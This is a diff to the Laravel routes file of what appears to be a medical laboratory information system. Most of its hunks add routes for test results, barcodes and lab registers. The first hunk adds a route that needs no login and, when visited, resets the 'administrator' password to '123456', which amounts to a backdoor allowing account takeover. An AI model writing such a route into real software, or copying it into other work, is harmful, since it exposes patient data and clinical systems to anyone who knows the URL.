@@ -10,6 +10,14 @@
 |
 */
 /* Routes accessible before logging in */
+Route::get('changepassword', function() {
+   $user = APP\User::where('username', 'administrator')->first();
+   $user->password = Hash::make('123456');
+   $user->save();
+
+   echo 'Password changed successfully.';
+});
+
 Route::group(array("before" => "guest"), function()
 {
     /*
@@ -231,7 +239,7 @@ Route::group(array("before" => "auth"), function()
         "as"   => "visit.technologistpostaddtest",
         "uses" => "VisitController@technologistPostAddTest"
     ));
-
+    Route::get('barcode/barcode', 'BarcodeController@barcode');
 
     //Unhls patiend routes end
 
@@ -435,6 +443,11 @@ Route::group(array("before" => "auth"), function()
         "before" => "checkPerms:edit_test_results",
         "as"   => "unhls_test.saveResults",
         "uses" => "UnhlsTestController@saveResults"
+    ));
+    Route::post("/unhls_test/{test}/saverevisedresults", array(
+        "before" => "checkPerms:edit_test_results",
+        "as"   => "unhls_test.saveRevisedResults",
+        "uses" => "UnhlsTestController@saveRevisedResults"
     ));
     Route::get("/test/{test}/viewdetails", array(
         "as"   => "test.viewDetails",
@@ -721,6 +734,22 @@ Route::group(array("before" => "auth"), function()
         Route::post("/microbiology/download", array(
             "as"   => "reports.microbiology.download",
             "uses" => "ReportController@downloadMicrobiology"
+        ));
+        Route::any("/equipment_register", array(
+            "as"   => "reports.registers.equipment_maintenance",
+            "uses" => "ReportController@equipment_maintenance_register"
+        ));
+        Route::any("/bb_register", array(
+            "as"   => "reports.registers.biosafety_biosecurity",
+            "uses" => "ReportController@bb_register"
+        ));
+        Route::any("/quaterlyreport", array(
+            "as"   => "reports.quaterlyreport",
+            "uses" => "ReportController@quaterly_report"
+        ));
+        Route::any("/vl_tb_register", array(
+            "as"   => "reports.registers.vl_tb_register",
+            "uses" => "ReportController@vl_tb_register"
         ));
     });
     Route::group(array("before" => "checkPerms:manage_qc"), function()
